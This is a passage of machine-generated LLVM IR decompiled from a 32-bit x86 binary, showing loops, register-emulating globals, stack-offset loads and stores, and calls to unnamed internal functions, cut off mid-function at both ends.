  %v0_8054cc6 = load i32, i32* @ebx, align 4
  %v1_8054cc6 = add i32 %v0_8054cc6, 1
  store i32 %v1_8054cc6, i32* @ebx, align 4
  %v0_8054cc7 = load i32, i32* @esi, align 4
  %v2_8054cc7 = add i32 %v0_8054cc7, %v0_8054cc1
  store i32 %v2_8054cc7, i32* @esi, align 4
  %v0_8054cc9 = load i32, i32* @esp, align 4
  %v1_8054cc9 = add i32 %v0_8054cc9, 16
  %v2_8054ccc = add i32 %v0_8054cc9, 116
  %v3_8054ccc = inttoptr i32 %v2_8054ccc to i32*
  %v4_8054ccc = load i32, i32* %v3_8054ccc, align 4
  %v5_8054ccc = sub i32 %v1_8054cc6, %v4_8054ccc
  %v11_8054ccc = xor i32 %v4_8054ccc, %v1_8054cc6
  %v12_8054ccc = xor i32 %v5_8054ccc, %v1_8054cc6
  %v13_8054ccc = and i32 %v12_8054ccc, %v11_8054ccc
  %v14_8054ccc = icmp slt i32 %v13_8054ccc, 0
  %v16_8054ccc = icmp slt i32 %v5_8054ccc, 0
  %v2_8054cd0 = icmp eq i1 %v16_8054ccc, %v14_8054ccc
  br i1 %v2_8054cd0, label %dec_label_pc_8054cd2, label %dec_label_pc_8054cbd

dec_label_pc_8054cd2:                             ; preds = %dec_label_pc_8054cbd, %dec_label_pc_8054ca4
  %v0_8054cd4.lcssa = phi i32 [ %v1_8054c0c, %dec_label_pc_8054ca4 ], [ %v1_8054cc9, %dec_label_pc_8054cbd ]
  store i32 0, i32* @ebx, align 4
  %v1_8054cd4 = add i32 %v0_8054cd4.lcssa, 27
  %v2_8054cd4 = inttoptr i32 %v1_8054cd4 to i8*
  store i8 1, i8* %v2_8054cd4, align 1
  %v0_8054e02.pre = load i32, i32* @ebx, align 4
  %v1_8054e02.pre = load i32, i32* @esp, align 4
  %v2_8054e0267 = add i32 %v1_8054e02.pre, 104
  %v3_8054e0268 = inttoptr i32 %v2_8054e0267 to i32*
  %v4_8054e0269 = load i32, i32* %v3_8054e0268, align 4
  %v5_8054e0270 = sub i32 %v0_8054e02.pre, %v4_8054e0269
  %v11_8054e0271 = xor i32 %v4_8054e0269, %v0_8054e02.pre
  %v12_8054e0272 = xor i32 %v5_8054e0270, %v0_8054e02.pre
  %v13_8054e0273 = and i32 %v12_8054e0272, %v11_8054e0271
  %v14_8054e0274 = icmp slt i32 %v13_8054e0273, 0
  %v16_8054e0276 = icmp slt i32 %v5_8054e0270, 0
  %v2_8054e0677 = icmp eq i1 %v16_8054e0276, %v14_8054e0274
  br i1 %v2_8054e0677, label %dec_label_pc_8054e12, label %dec_label_pc_8054e08.lr.ph

dec_label_pc_8054e08.lr.ph:                       ; preds = %dec_label_pc_8054cd2
  %v0_8054e08.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054e08

dec_label_pc_8054cde:                             ; preds = %dec_label_pc_8054e08
  %v1_8054cde = add i32 %v0_8054cde78, 116
  store i32 %v1_8054cde, i32* %eax.global-to-local, align 4
  %v2_8054ce2 = add i32 %v0_8054cde78, -4
  %v3_8054ce2 = inttoptr i32 %v2_8054ce2 to i32*
  store i32 %v1_8054cde, i32* %v3_8054ce2, align 4
  %v3_8054ce3 = load i32, i32* %v3_8054e08, align 4
  %v5_8054ce3 = add i32 %v0_8054cde78, -8
  %v6_8054ce3 = inttoptr i32 %v5_8054ce3 to i32*
  store i32 %v3_8054ce3, i32* %v6_8054ce3, align 4
  %v0_8054ce7 = load i32, i32* @esi, align 4
  %v2_8054ce7 = add i32 %v0_8054cde78, -12
  %v3_8054ce7 = inttoptr i32 %v2_8054ce7 to i32*
  store i32 %v0_8054ce7, i32* %v3_8054ce7, align 4
  %v2_8054ce8 = add i32 %v0_8054cde78, -16
  %v3_8054ce8 = inttoptr i32 %v2_8054ce8 to i32*
  store i32 %v1_80548a2, i32* %v3_8054ce8, align 4
  %v0_8054ce9 = call i32 @function_8056330()
  store i32 %v0_8054ce9, i32* @eax, align 4
  %v1_8054cee = load i32, i32* @esp, align 4
  %v2_8054cee = add i32 %v1_8054cee, 68
  %v3_8054cee = inttoptr i32 %v2_8054cee to i32*
  store i32 %v0_8054ce9, i32* %v3_8054cee, align 4
  %v0_8054cf2 = load i32, i32* @esp, align 4
  %v1_8054cf2 = add i32 %v0_8054cf2, 16
  %v2_8054cf5 = icmp slt i32 %v0_8054ce9, 0
  %v1_8054cf7 = icmp eq i1 %v2_8054cf5, false
  br i1 %v1_8054cf7, label %dec_label_pc_8054d11, label %dec_label_pc_8054cf9

dec_label_pc_8054cf9:                             ; preds = %dec_label_pc_8054cde
  %v0_8054cf9 = load i32, i32* @ebx, align 4
  %v1_8054cf9 = icmp eq i32 %v0_8054cf9, 0
  br i1 %v1_8054cf9, label %dec_label_pc_8054ea4, label %dec_label_pc_8054d01

dec_label_pc_8054d01:                             ; preds = %dec_label_pc_8054cf9
  %v1_8054d01 = add i32 %v0_8054cf2, 100
  %v2_8054d01 = inttoptr i32 %v1_8054d01 to i32*
  %v3_8054d01 = load i32, i32* %v2_8054d01, align 4
  %v4_8054d01 = icmp eq i32 %v3_8054d01, 0
  br i1 %v4_8054d01, label %dec_label_pc_8054ea4, label %dec_label_pc_8054e12

dec_label_pc_8054d11:                             ; preds = %dec_label_pc_8054cde
  %v1_8054d11 = add i32 %v0_8054cf2, 43
  %v2_8054d11 = inttoptr i32 %v1_8054d11 to i8*
  %v3_8054d11 = load i8, i8* %v2_8054d11, align 1
  %v4_8054d11 = icmp eq i8 %v3_8054d11, 0
  br i1 %v4_8054d11, label %dec_label_pc_8054db2, label %dec_label_pc_8054d1c

dec_label_pc_8054d1c:                             ; preds = %dec_label_pc_8054d11
  %v0_8054d1c = load i32, i32* @edi, align 4
  %v1_8054d1c = add i32 %v0_8054d1c, 28
  %v2_8054d1c = inttoptr i32 %v1_8054d1c to i32*
  %v3_8054d1c = load i32, i32* %v2_8054d1c, align 4
  store i32 %v3_8054d1c, i32* %eax.global-to-local, align 4
  %v2_8054d1f = add i32 %v0_8054cf2, 160
  %v3_8054d1f = inttoptr i32 %v2_8054d1f to i32*
  store i32 %v3_8054d1c, i32* %v3_8054d1f, align 4
  %v0_8054d26 = load i32, i32* @edi, align 4
  %v1_8054d26 = add i32 %v0_8054d26, 32
  %v2_8054d26 = inttoptr i32 %v1_8054d26 to i32*
  %v3_8054d26 = load i32, i32* %v2_8054d26, align 4
  store i32 %v3_8054d26, i32* %eax.global-to-local, align 4
  %v1_8054d29 = load i32, i32* @esp, align 4
  %v2_8054d29 = add i32 %v1_8054d29, 148
  %v3_8054d29 = inttoptr i32 %v2_8054d29 to i32*
  store i32 %v3_8054d26, i32* %v3_8054d29, align 4
  %v0_8054d30 = load i32, i32* @edi, align 4
  %v1_8054d30 = add i32 %v0_8054d30, 36
  %v2_8054d30 = inttoptr i32 %v1_8054d30 to i32*
  %v3_8054d30 = load i32, i32* %v2_8054d30, align 4
  store i32 %v3_8054d30, i32* %eax.global-to-local, align 4
  %v1_8054d33 = load i32, i32* @esp, align 4
  %v2_8054d33 = add i32 %v1_8054d33, 152
  %v3_8054d33 = inttoptr i32 %v2_8054d33 to i32*
  store i32 %v3_8054d30, i32* %v3_8054d33, align 4
  %v0_8054d3a = load i32, i32* @ecx, align 4
  %v1_8054d3a = load i32, i32* @esp, align 4
  %v2_8054d3a = add i32 %v1_8054d3a, -4
  %v3_8054d3a = inttoptr i32 %v2_8054d3a to i32*
  store i32 %v0_8054d3a, i32* %v3_8054d3a, align 4
  %v1_8054d3b = add i32 %v1_8054d3a, -8
  %v2_8054d3b = inttoptr i32 %v1_8054d3b to i32*
  store i32 40, i32* %v2_8054d3b, align 4
  %v1_8054d3d = add i32 %v1_8054d3a, 116
  store i32 %v1_8054d3d, i32* %edx.global-to-local, align 4
  %v2_8054d41 = add i32 %v1_8054d3a, -12
  %v3_8054d41 = inttoptr i32 %v2_8054d41 to i32*
  store i32 %v1_8054d3d, i32* %v3_8054d41, align 4
  %v0_8054d42 = load i32, i32* @edi, align 4
  %v2_8054d42 = add i32 %v1_8054d3a, -16
  %v3_8054d42 = inttoptr i32 %v2_8054d42 to i32*
  store i32 %v0_8054d42, i32* %v3_8054d42, align 4
  %v5_8054d43 = call i32 @function_8051414(i16* inttoptr (i32 -1 to i16*), i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v5_8054d43, i32* %eax.global-to-local, align 4
  %v0_8054d48 = load i32, i32* @edi, align 4
  %v1_8054d48 = add i32 %v0_8054d48, 4
  %v2_8054d48 = inttoptr i32 %v1_8054d48 to i32*
  %v3_8054d48 = load i32, i32* %v2_8054d48, align 4
  store i32 %v3_8054d48, i32* %eax.global-to-local, align 4
  %v0_8054d4b = load i32, i32* @esp, align 4
  %v1_8054d4b = add i32 %v0_8054d4b, 16
  %v9_8054d4e = icmp eq i32 %v3_8054d48, 24
  br i1 %v9_8054d4e, label %dec_label_pc_8054d1c.dec_label_pc_8054d75_crit_edge, label %dec_label_pc_8054d53

dec_label_pc_8054d1c.dec_label_pc_8054d75_crit_edge: ; preds = %dec_label_pc_8054d1c
  %.pre24 = add i32 %v0_8054d4b, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8054d75.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8054d75

dec_label_pc_8054d53:                             ; preds = %dec_label_pc_8054d1c
  %v1_8054d53 = add i32 %v0_8054d48, 28
  %v2_8054d53 = inttoptr i32 %v1_8054d53 to i32*
  %v3_8054d53 = load i32, i32* %v2_8054d53, align 4
  %v4_8054d53 = icmp eq i32 %v3_8054d53, 0
  br i1 %v4_8054d53, label %dec_label_pc_8054e12, label %dec_label_pc_8054d5d

dec_label_pc_8054d5d:                             ; preds = %dec_label_pc_8054d53
  %v1_8054d5d = add i32 %v0_8054d4b, 260
  %v2_8054d5d = inttoptr i32 %v1_8054d5d to i32*
  %v3_8054d5d = load i32, i32* %v2_8054d5d, align 4
  %v12_8054d5d = icmp eq i32 %v3_8054d5d, 1
  br i1 %v12_8054d5d, label %dec_label_pc_8054d75, label %dec_label_pc_8054d67

dec_label_pc_8054d67:                             ; preds = %dec_label_pc_8054d5d
  %v12_8054d67 = icmp eq i32 %v3_8054d5d, 28
  %v1_8054d6f = icmp eq i1 %v12_8054d67, false
  br i1 %v1_8054d6f, label %dec_label_pc_8054e12, label %dec_label_pc_8054d75

dec_label_pc_8054d75:                             ; preds = %dec_label_pc_8054d1c.dec_label_pc_8054d75_crit_edge, %dec_label_pc_8054d67, %dec_label_pc_8054d5d
  %v4_8054d75 = phi i32 [ %v4_8054d75.pre, %dec_label_pc_8054d1c.dec_label_pc_8054d75_crit_edge ], [ %v3_8054d5d, %dec_label_pc_8054d67 ], [ 1, %dec_label_pc_8054d5d ]
  %v15_8054d75 = icmp eq i32 %v3_8054d48, %v4_8054d75
  br i1 %v15_8054d75, label %dec_label_pc_8054d8a, label %dec_label_pc_8054d7e

dec_label_pc_8054d7e:                             ; preds = %dec_label_pc_8054d75
  %v1_8054d81 = inttoptr i32 %v0_8054d48 to i32*
  %v2_8054d81 = load i32, i32* %v1_8054d81, align 4
  %v5_8054d81 = inttoptr i32 %v0_8054d4b to i32*
  store i32 %v2_8054d81, i32* %v5_8054d81, align 4
  %v1_8054d83 = call i32 @function_8052915(i32 -1)
  store i32 %v1_8054d83, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054dfa

dec_label_pc_8054d8a:                             ; preds = %dec_label_pc_8054d75
  %v0_8054d8a = load i32, i32* @ebx, align 4
  %v1_8054d8c = sub i32 -1, %v0_8054d8a
  store i32 %v1_8054d8c, i32* %eax.global-to-local, align 4
  %v2_8054d8e = add i32 %v0_8054d4b, 120
  %v3_8054d8e = inttoptr i32 %v2_8054d8e to i32*
  %v4_8054d8e = load i32, i32* %v3_8054d8e, align 4
  %v5_8054d8e = add i32 %v4_8054d8e, %v1_8054d8c
  store i32 %v5_8054d8e, i32* %eax.global-to-local, align 4
  %v2_8054d92 = add i32 %v0_8054d48, 36
  %v3_8054d92 = inttoptr i32 %v2_8054d92 to i32*
  store i32 %v5_8054d8e, i32* %v3_8054d92, align 4
  %v0_8054d95 = load i32, i32* @edi, align 4
  %v1_8054d95 = add i32 %v0_8054d95, 16
  %v2_8054d95 = inttoptr i32 %v1_8054d95 to i32*
  %v3_8054d95 = load i32, i32* %v2_8054d95, align 4
  %v1_8054d98 = add i32 %v3_8054d95, 4
  store i32 %v1_8054d98, i32* %eax.global-to-local, align 4
  %v2_8054d9b = add i32 %v0_8054d95, 36
  %v3_8054d9b = inttoptr i32 %v2_8054d9b to i32*
  %v4_8054d9b = load i32, i32* %v3_8054d9b, align 4
  %v7_8054d9b = mul i32 %v4_8054d9b, %v1_8054d98
  store i32 %v7_8054d9b, i32* %eax.global-to-local, align 4
  %v2_8054d9f = add i32 %v0_8054d95, 32
  %v3_8054d9f = inttoptr i32 %v2_8054d9f to i32*
  %v4_8054d9f = load i32, i32* %v3_8054d9f, align 4
  %v6_8054da2 = icmp ugt i32 %v7_8054d9b, %v4_8054d9f
  br i1 %v6_8054da2, label %dec_label_pc_8054d8a.dec_label_pc_8054e12.loopexit_crit_edge, label %dec_label_pc_8054da4

dec_label_pc_8054d8a.dec_label_pc_8054e12.loopexit_crit_edge: ; preds = %dec_label_pc_8054d8a
  %v0_8054e12.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054e12

dec_label_pc_8054da4:                             ; preds = %dec_label_pc_8054d8a
  store i32 0, i32* %v3_8054d9b, align 4
  %v0_8054dab = load i32, i32* @esp, align 4
  %v1_8054dab = add i32 %v0_8054dab, 27
  %v2_8054dab = inttoptr i32 %v1_8054dab to i8*
  store i8 0, i8* %v2_8054dab, align 1
  %v1_8054dfd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054dfd

dec_label_pc_8054db2:                             ; preds = %dec_label_pc_8054d11
  %v1_8054db5 = add i32 %v0_8054cf2, 132
  %v2_8054db5 = inttoptr i32 %v1_8054db5 to i32*
  %v3_8054db5 = load i32, i32* %v2_8054db5, align 4
  %v6_8054db5 = inttoptr i32 %v0_8054cf2 to i32*
  store i32 %v3_8054db5, i32* %v6_8054db5, align 4
  %v1_8054dbc = call i32 @function_8052915(i32 -1)
  store i32 %v1_8054dbc, i32* %eax.global-to-local, align 4
  %v0_8054dc1 = load i32, i32* @esp, align 4
  %v1_8054dc1 = add i32 %v0_8054dc1, 16
  %v1_8054dc4 = add i32 %v0_8054dc1, 260
  %v2_8054dc4 = inttoptr i32 %v1_8054dc4 to i32*
  %v3_8054dc4 = load i32, i32* %v2_8054dc4, align 4
  store i32 %v3_8054dc4, i32* %eax.global-to-local, align 4
  %v1_8054dcb = add i32 %v0_8054dc1, 136
  %v2_8054dcb = inttoptr i32 %v1_8054dcb to i32*
  %v3_8054dcb = load i32, i32* %v2_8054dcb, align 4
  %v15_8054dcb = icmp eq i32 %v3_8054dcb, %v3_8054dc4
  %v1_8054dcf = icmp eq i1 %v15_8054dcb, false
  br i1 %v1_8054dcf, label %dec_label_pc_8054dfd, label %dec_label_pc_8054dd1

dec_label_pc_8054dd1:                             ; preds = %dec_label_pc_8054db2
  %v0_8054dd1 = load i32, i32* @edi, align 4
  %v1_8054dd1 = add i32 %v0_8054dd1, 16
  %v2_8054dd1 = inttoptr i32 %v1_8054dd1 to i32*
  %v3_8054dd1 = load i32, i32* %v2_8054dd1, align 4
  store i32 %v3_8054dd1, i32* %eax.global-to-local, align 4
  %v2_8054dd4 = add i32 %v0_8054dc1, 148
  %v3_8054dd4 = inttoptr i32 %v2_8054dd4 to i32*
  %v4_8054dd4 = load i32, i32* %v3_8054dd4, align 4
  %v15_8054dd4 = icmp eq i32 %v3_8054dd1, %v4_8054dd4
  %v1_8054ddb = icmp eq i1 %v15_8054dd4, false
  br i1 %v1_8054ddb, label %dec_label_pc_8054e97, label %dec_label_pc_8054de1

dec_label_pc_8054de1:                             ; preds = %dec_label_pc_8054dd1
  %v0_8054de1 = load i32, i32* @edx, align 4
  %v2_8054de1 = add i32 %v0_8054dc1, 12
  %v3_8054de1 = inttoptr i32 %v2_8054de1 to i32*
  store i32 %v0_8054de1, i32* %v3_8054de1, align 4
  %v0_8054de2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054de2 = add i32 %v0_8054dc1, 8
  %v3_8054de2 = inttoptr i32 %v2_8054de2 to i32*
  store i32 %v0_8054de2, i32* %v3_8054de2, align 4
  %v1_8054de3 = add i32 %v0_8054dc1, 152
  %v2_8054de3 = inttoptr i32 %v1_8054de3 to i32*
  %v3_8054de3 = load i32, i32* %v2_8054de3, align 4
  %v5_8054de3 = add i32 %v0_8054dc1, 4
  %v6_8054de3 = inttoptr i32 %v5_8054de3 to i32*
  store i32 %v3_8054de3, i32* %v6_8054de3, align 4
  %v0_8054dea = load i32, i32* %eax.global-to-local, align 4
  %v1_8054dea = load i32, i32* @edi, align 4
  %v2_8054dea = add i32 %v1_8054dea, 36
  %v3_8054dea = inttoptr i32 %v2_8054dea to i32*
  %v4_8054dea = load i32, i32* %v3_8054dea, align 4
  %v7_8054dea = mul i32 %v4_8054dea, %v0_8054dea
  store i32 %v7_8054dea, i32* %eax.global-to-local, align 4
  %v2_8054dee = add i32 %v1_8054dea, 28
  %v3_8054dee = inttoptr i32 %v2_8054dee to i32*
  %v4_8054dee = load i32, i32* %v3_8054dee, align 4
  %v5_8054dee = add i32 %v4_8054dee, %v7_8054dea
  store i32 %v5_8054dee, i32* %eax.global-to-local, align 4
  %v3_8054df1 = inttoptr i32 %v0_8054dc1 to i32*
  store i32 %v5_8054dee, i32* %v3_8054df1, align 4
  %v5_8054df2 = call i32 @function_8051414(i16* inttoptr (i32 -1 to i16*), i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v5_8054df2, i32* %eax.global-to-local, align 4
  %v0_8054df7 = load i32, i32* @edi, align 4
  %v1_8054df7 = add i32 %v0_8054df7, 36
  %v2_8054df7 = inttoptr i32 %v1_8054df7 to i32*
  %v3_8054df7 = load i32, i32* %v2_8054df7, align 4
  %v4_8054df7 = add i32 %v3_8054df7, 1
  store i32 %v4_8054df7, i32* %v2_8054df7, align 4
  br label %dec_label_pc_8054dfa

dec_label_pc_8054dfa:                             ; preds = %dec_label_pc_8054d7e, %dec_label_pc_8054de1
  %v0_8054dfa = load i32, i32* @esp, align 4
  %v1_8054dfa = add i32 %v0_8054dfa, 16
  br label %dec_label_pc_8054dfd

dec_label_pc_8054dfd:                             ; preds = %dec_label_pc_8054db2, %dec_label_pc_8054da4, %dec_label_pc_8054dfa
  %v1_8054dfd = phi i32 [ %v1_8054dc1, %dec_label_pc_8054db2 ], [ %v1_8054dfd.pre, %dec_label_pc_8054da4 ], [ %v1_8054dfa, %dec_label_pc_8054dfa ]
  %v0_8054dfd = load i32, i32* @esi, align 4
  %v2_8054dfd = add i32 %v1_8054dfd, 52
  %v3_8054dfd = inttoptr i32 %v2_8054dfd to i32*
  %v4_8054dfd = load i32, i32* %v3_8054dfd, align 4
  %v5_8054dfd = add i32 %v4_8054dfd, %v0_8054dfd
  store i32 %v5_8054dfd, i32* @esi, align 4
  %v0_8054e01 = load i32, i32* @ebx, align 4
  %v1_8054e01 = add i32 %v0_8054e01, 1
  store i32 %v1_8054e01, i32* @ebx, align 4
  %v2_8054e02 = add i32 %v1_8054dfd, 104
  %v3_8054e02 = inttoptr i32 %v2_8054e02 to i32*
  %v4_8054e02 = load i32, i32* %v3_8054e02, align 4
  %v5_8054e02 = sub i32 %v1_8054e01, %v4_8054e02
  %v11_8054e02 = xor i32 %v4_8054e02, %v1_8054e01
  %v12_8054e02 = xor i32 %v5_8054e02, %v1_8054e01
  %v13_8054e02 = and i32 %v12_8054e02, %v11_8054e02
  %v14_8054e02 = icmp slt i32 %v13_8054e02, 0
  %v16_8054e02 = icmp slt i32 %v5_8054e02, 0
  %v2_8054e06 = icmp eq i1 %v16_8054e02, %v14_8054e02
  br i1 %v2_8054e06, label %dec_label_pc_8054e12, label %dec_label_pc_8054e08

dec_label_pc_8054e08:                             ; preds = %dec_label_pc_8054e08.lr.ph, %dec_label_pc_8054dfd
  %v0_8054e08 = phi i32 [ %v0_8054e08.pre, %dec_label_pc_8054e08.lr.ph ], [ %v5_8054dfd, %dec_label_pc_8054dfd ]
  %v0_8054cde78 = phi i32 [ %v1_8054e02.pre, %dec_label_pc_8054e08.lr.ph ], [ %v1_8054dfd, %dec_label_pc_8054dfd ]
  %v2_8054e08 = add i32 %v0_8054cde78, 16
  %v3_8054e08 = inttoptr i32 %v2_8054e08 to i32*
  %v4_8054e08 = load i32, i32* %v3_8054e08, align 4
  %v5_8054e08 = sub i32 %v0_8054e08, %v4_8054e08
  %v11_8054e08 = xor i32 %v4_8054e08, %v0_8054e08
  %v12_8054e08 = xor i32 %v5_8054e08, %v0_8054e08
  %v13_8054e08 = and i32 %v12_8054e08, %v11_8054e08
  %v14_8054e08 = icmp slt i32 %v13_8054e08, 0
  %v16_8054e08 = icmp slt i32 %v5_8054e08, 0
  %v2_8054e0c = icmp eq i1 %v16_8054e08, %v14_8054e08
  br i1 %v2_8054e0c, label %dec_label_pc_8054e12, label %dec_label_pc_8054cde

dec_label_pc_8054e12:                             ; preds = %dec_label_pc_8054d01, %dec_label_pc_8054cd2, %dec_label_pc_8054dfd, %dec_label_pc_8054d53, %dec_label_pc_8054d67, %dec_label_pc_8054e08, %dec_label_pc_8054d8a.dec_label_pc_8054e12.loopexit_crit_edge
  %v0_8054e12 = phi i32 [ %v0_8054e12.pre.pre, %dec_label_pc_8054d8a.dec_label_pc_8054e12.loopexit_crit_edge ], [ %v1_8054e02.pre, %dec_label_pc_8054cd2 ], [ %v1_8054dfd, %dec_label_pc_8054dfd ], [ %v1_8054d4b, %dec_label_pc_8054d53 ], [ %v1_8054d4b, %dec_label_pc_8054d67 ], [ %v0_8054cde78, %dec_label_pc_8054e08 ], [ %v1_8054cf2, %dec_label_pc_8054d01 ]
  %v1_8054e15 = add i32 %v0_8054e12, 20
  %v2_8054e15 = inttoptr i32 %v1_8054e15 to i32*
  %v3_8054e15 = load i32, i32* %v2_8054e15, align 4
  %v5_8054e15 = add i32 %v0_8054e12, -16
  %v6_8054e15 = inttoptr i32 %v5_8054e15 to i32*
  store i32 %v3_8054e15, i32* %v6_8054e15, align 4
  %v1_8054e19 = call i32 @function_8050138(i32 -1)
  store i32 %v1_8054e19, i32* %eax.global-to-local, align 4
  %v0_8054e1e = load i32, i32* @esp, align 4
  %v1_8054e21 = add i32 %v0_8054e1e, 272
  %v2_8054e21 = inttoptr i32 %v1_8054e21 to i32*
  %v3_8054e21 = load i32, i32* %v2_8054e21, align 4
  %v4_8054e21 = icmp eq i32 %v3_8054e21, 0
  br i1 %v4_8054e21, label %dec_label_pc_8054e36, label %dec_label_pc_8054e2b

dec_label_pc_8054e2b:                             ; preds = %dec_label_pc_8054e12
  store i32 %v3_8054e21, i32* %edx.global-to-local, align 4
  %v2_8054e32 = inttoptr i32 %v3_8054e21 to i32*
  store i32 %v1_80548a2, i32* %v2_8054e32, align 4
  %v0_8054e42.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054e42

dec_label_pc_8054e36:                             ; preds = %dec_label_pc_8054e12
  %v3_8054e39 = inttoptr i32 %v0_8054e1e to i32*
  store i32 %v1_80548a2, i32* %v3_8054e39, align 4
  %v1_8054e3a = call i32 @function_8052915(i32 -1)
  store i32 %v1_8054e3a, i32* %eax.global-to-local, align 4
  %v0_8054e3f = load i32, i32* @esp, align 4
  %v1_8054e3f = add i32 %v0_8054e3f, 16
  br label %dec_label_pc_8054e42

dec_label_pc_8054e42:                             ; preds = %dec_label_pc_8054e2b, %dec_label_pc_8054e36
  %v0_8054e42 = phi i32 [ %v0_8054e42.pre, %dec_label_pc_8054e2b ], [ %v1_8054e3f, %dec_label_pc_8054e36 ]
  %v1_8054e45 = add i32 %v0_8054e42, 12
  %v2_8054e45 = inttoptr i32 %v1_8054e45 to i32*
  %v3_8054e45 = load i32, i32* %v2_8054e45, align 4
  %v5_8054e45 = add i32 %v0_8054e42, -16
  %v6_8054e45 = inttoptr i32 %v5_8054e45 to i32*
  store i32 %v3_8054e45, i32* %v6_8054e45, align 4
  %v1_8054e49 = call i32 @function_8052915(i32 -1)
  store i32 %v1_8054e49, i32* @eax, align 4
  %v0_8054e4e = load i32, i32* @esp, align 4
  %v1_8054e51 = add i32 %v0_8054e4e, 8
  %v2_8054e51 = inttoptr i32 %v1_8054e51 to i32*
  store i32 ptrtoint (i32* @global_var_8063b28.395 to i32), i32* %v2_8054e51, align 4
  %v1_8054e56 = add i32 %v0_8054e4e, 4
  %v2_8054e56 = inttoptr i32 %v1_8054e56 to i32*
  store i32 134559183, i32* %v2_8054e56, align 4
  %v1_8054e5b = add i32 %v0_8054e4e, 200
  store i32 %v1_8054e5b, i32* %ebx.global-to-local, align 4
  %v3_8054e62 = inttoptr i32 %v0_8054e4e to i32*
  store i32 %v1_8054e5b, i32* %v3_8054e62, align 4
  %v2_8054e63 = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054e63, i32* %eax.global-to-local, align 4
  %v0_8054e68 = load i32, i32* @esp, align 4
  %v1_8054e68 = inttoptr i32 %v0_8054e68 to i32*
  store i32 ptrtoint (i32* @global_var_8063b28.395 to i32), i32* %v1_8054e68, align 4
  %v1_8054e6f = call i32 @function_80535cf(i32 -1)
  store i32 %v1_8054e6f, i32* %eax.global-to-local, align 4
  %v0_8054e74 = load i32, i32* @esp, align 4
  %v1_8054e74 = add i32 %v0_8054e74, 56
  %v2_8054e74 = inttoptr i32 %v1_8054e74 to i32*
  %v3_8054e74 = load i32, i32* %v2_8054e74, align 4
  store i32 %v3_8054e74, i32* @eax, align 4
  %v1_8054e78 = add i32 %v0_8054e74, 72
  %v2_8054e78 = inttoptr i32 %v1_8054e78 to i32*
  %v3_8054e78 = load i32, i32* %v2_8054e78, align 4
  store i32 %v3_8054e78, i32* %edx.global-to-local, align 4
  %v1_8054e7c = inttoptr i32 %v0_8054e74 to i32*
  %v3_8054e7c = add i32 %v0_8054e74, 4
  %v1_8054e7d = inttoptr i32 %v3_8054e7c to i32*
  store i32 1, i32* %v1_8054e7d, align 4
  %v0_8054e80 = load i32, i32* @eax, align 4
  %v1_8054e80 = sext i32 %v0_8054e80 to i64
  store i64 %v1_8054e80, i64* @global_var_8063b40.396, align 64
  %v0_8054e85 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054e85 = trunc i32 %v0_8054e85 to i16
  store i16 %v1_8054e85, i16* @global_var_805d884.397, align 4
  %v0_8054e8c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054e8c, i32* %v1_8054e7c, align 4
  %v2_8054e8d = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054e8d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054fce

dec_label_pc_8054e97:                             ; preds = %dec_label_pc_8054dd1
  %v1_8054e9a = inttoptr i32 %v0_8054dd1 to i32*
  %v2_8054e9a = load i32, i32* %v1_8054e9a, align 4
  %v5_8054e9a = inttoptr i32 %v0_8054dc1 to i32*
  store i32 %v2_8054e9a, i32* %v5_8054e9a, align 4
  %v1_8054e9c = call i32 @function_8052915(i32 -1)
  store i32 %v1_8054e9c, i32* @eax, align 4
  %v0_8054ea1 = load i32, i32* @esp, align 4
  %v1_8054ea1 = add i32 %v0_8054ea1, 16
  br label %dec_label_pc_8054ea4

dec_label_pc_8054ea4:                             ; preds = %dec_label_pc_8054bd6, %dec_label_pc_8054d01, %dec_label_pc_8054cf9, %dec_label_pc_8054c95, %dec_label_pc_8054c1b, %dec_label_pc_8054bf7, %dec_label_pc_8054e97
  %v1_8054eab = phi i32 [ %v1_8054beb, %dec_label_pc_8054bd6 ], [ %v1_8054cf2, %dec_label_pc_8054d01 ], [ %v1_8054cf2, %dec_label_pc_8054cf9 ], [ %v1_8054c0c, %dec_label_pc_8054c95 ], [ %v1_8054c0c, %dec_label_pc_8054c1b ], [ %v1_8054c0c, %dec_label_pc_8054bf7 ], [ %v1_8054ea1, %dec_label_pc_8054e97 ]
  %v1_8054ea4 = add i32 %v1_8054eab, 51
  %v2_8054ea4 = inttoptr i32 %v1_8054ea4 to i8*
  %v3_8054ea4 = load i8, i8* %v2_8054ea4, align 1
  %v4_8054ea4 = icmp eq i8 %v3_8054ea4, 0
  %v1_8054ea9 = icmp eq i1 %v4_8054ea4, false
  br i1 %v1_8054ea9, label %dec_label_pc_8054eef, label %dec_label_pc_8054eab

dec_label_pc_8054eab:                             ; preds = %dec_label_pc_8054ea4
  %v0_8054eab = load i32, i32* @ecx, align 4
  %v2_8054eab = add i32 %v1_8054eab, -4
  %v3_8054eab = inttoptr i32 %v2_8054eab to i32*
  store i32 %v0_8054eab, i32* %v3_8054eab, align 4
  %v1_8054eac = add i32 %v1_8054eab, -8
  %v2_8054eac = inttoptr i32 %v1_8054eac to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v2_8054eac, align 4
  %v1_8054eb1 = add i32 %v1_8054eab, -12
  %v2_8054eb1 = inttoptr i32 %v1_8054eb1 to i32*
  store i32 134559183, i32* %v2_8054eb1, align 4
  %v1_8054eb6 = add i32 %v1_8054eab, 184
  store i32 %v1_8054eb6, i32* @esi, align 4
  %v2_8054ebd = add i32 %v1_8054eab, -16
  %v3_8054ebd = inttoptr i32 %v2_8054ebd to i32*
  store i32 %v1_8054eb6, i32* %v3_8054ebd, align 4
  %v2_8054ebe = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054ebe, i32* %eax.global-to-local, align 4
